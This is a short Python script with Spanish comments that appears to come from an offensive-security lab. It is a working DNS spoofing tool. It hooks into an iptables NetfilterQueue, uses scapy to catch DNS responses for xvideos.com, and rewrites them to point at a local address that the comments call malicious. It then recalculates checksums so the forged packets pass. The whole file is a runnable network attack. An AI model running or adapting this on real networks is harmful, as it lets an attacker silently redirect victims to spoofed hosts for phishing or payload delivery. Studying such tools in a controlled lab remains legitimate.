#!/usr/bin/env python3

# Importamos las bibliotecas necesarias
import netfilterqueue  # Para trabajar con la cola de paquetes de iptables
import scapy.all as scapy  # Para manipular paquetes de red
import signal  # Para manejar señales como interrupciones de teclado
import sys  # Para acceder a funcionalidades del sistema

# Definimos un manejador para cuando se recibe una señal de salida (Ctrl+C)
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Función para procesar cada paquete
def process_packet(packet):
    # Convertimos el paquete en un paquete Scapy para poder manipularlo
    scapy_packet = scapy.IP(packet.get_payload())

    # Verificamos si el paquete tiene una capa DNS Response (DNSR)
    if scapy_packet.haslayer(scapy.DNSRR):
        # Obtenemos el nombre de dominio consultado (qname)
        qname = scapy_packet[scapy.DNSQR].qname

        # Verificamos si el dominio específico "xvideos.com" está en la consulta
        if b"xvideos.com" in qname:
            print("\n[+] Envenenando el dominio xvideos.com")

            # Creamos una respuesta DNS falsa con una IP maliciosa
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40")

            # Asignamos la respuesta al paquete DNS
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Eliminamos los checksums y longitudes para que Scapy los recalculen
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Actualizamos el contenido del paquete con la respuesta falsa
            packet.set_payload(scapy_packet.build())

    # Aceptamos el paquete para que continúe su curso
    packet.accept()

# Creamos una cola de NetfilterQueue y le asignamos la función de procesamiento
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
